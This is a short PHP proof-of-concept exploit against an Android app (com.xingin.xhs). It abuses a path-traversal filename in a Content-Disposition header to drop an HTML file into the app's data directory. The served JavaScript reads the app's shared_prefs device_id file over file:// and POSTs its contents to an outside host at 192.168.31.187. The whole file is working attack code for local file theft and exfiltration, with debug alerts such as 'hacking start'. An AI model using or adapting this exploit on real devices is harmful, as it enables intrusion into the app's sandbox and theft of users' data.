<?php

header("Content-Disposition: attachment;filename=..%2fdata%2fautodown.htm"); 
$data=<<<android_xss_go
<script>
function send(){
	var xhr = new XMLHttpRequest;
	xhr.onload = function(){
		alert('hacking start.');
		var txt = xhr.responseText;
		alert(txt);
		var xhr2 = new XMLHttpRequest;
		xhr2.open('POST', 'http://192.168.31.187/autodown.php');
		xhr2.send(txt);
		xhr2.onload = function(){
			alert('okok');
		}
		alert('hacking finished.');
	};
	xhr.open('GET','file:///data/data/com.xingin.xhs/shared_prefs/device_id.xml.xml');
	xhr.send(null);    
	alert('overall finished');
}
setTimeout(send, 1000);
alert("start");
</script>
android_xss_go;
print $data;
?>
